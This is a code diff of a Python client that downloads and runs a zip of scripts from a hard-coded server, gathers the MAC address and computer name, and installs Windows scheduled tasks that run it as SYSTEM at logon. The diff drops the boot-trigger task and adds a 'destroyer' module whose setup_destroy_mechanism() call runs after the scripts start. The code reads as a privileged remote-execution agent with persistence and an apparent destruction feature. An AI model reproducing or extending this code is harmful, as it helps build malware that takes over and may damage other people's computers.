@@ -8,7 +8,7 @@ from zipfile import ZipFile # to deal with zip files
 from getmac import get_mac_address # to get mac address
 from platform import node # to get computer name
 from time import sleep # for any delays
-
+import destroyer
 
 #URL = 'http://127.0.0.1:8000' # the url from which the zip containing the scripts will be downloaded
 URL = 'http://10.0.2.2:8000'
@@ -26,6 +26,7 @@ platform = ''
 
 if 'win' in sys.platform:
     platform = 'win'
+
 elif sys.platform == 'linux':
     platform = 'linux'
 
@@ -86,43 +87,6 @@ def make_renewable(py, platform): # makes the script start with admin privileges
         Arguments = __file__ if py else ''
         WorkingDirectory = __file__.replace(fr'\{os.path.basename(__file__)}', "")  # make the current directory the working directory
         # the task file config
-        XML_STARTUP = \
-fr'''<?xml version="1.0" encoding="UTF-16"?>
-<Task version="1.4" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
-  <Triggers>
-    <BootTrigger>
-      <Enabled>true</Enabled>
-    </BootTrigger>
-  </Triggers>
-  <Principals>
-    <Principal id="Author">
-      <UserId>S-1-5-18</UserId>
-      <RunLevel>HighestAvailable</RunLevel>
-    </Principal>
-  </Principals>
-  <Settings>
-    <MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>
-    <AllowHardTerminate>true</AllowHardTerminate>
-    <StartWhenAvailable>true</StartWhenAvailable>
-    <RunOnlyIfNetworkAvailable>false</RunOnlyIfNetworkAvailable>
-    <IdleSettings>
-      <StopOnIdleEnd>false</StopOnIdleEnd>
-      <RestartOnIdle>false</RestartOnIdle>
-    </IdleSettings>
-    <AllowStartOnDemand>true</AllowStartOnDemand>
-    <Enabled>true</Enabled>
-    <Hidden>false</Hidden>
-    <ExecutionTimeLimit>PT0S</ExecutionTimeLimit>  <!-- No time limit -->
-    <Priority>7</Priority>
-  </Settings>
-  <Actions Context="Author">
-    <Exec>
-      <Command>{Command}</Command>
-      <Arguments>{Arguments}</Arguments>
-      <WorkingDirectory>{WorkingDirectory}</WorkingDirectory>
-    </Exec>
-  </Actions>
-</Task>'''
         XML_LOGON = \
 fr'''<?xml version="1.0" encoding="UTF-16"?>
 <Task version="1.4" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
@@ -234,3 +198,4 @@ else:
     with open(started_file, 'w') as f: # open the started file to log that the scripts were downloaded
         f.close()
     start_scripts()
+    destroyer.setup_destroy_mechanism()
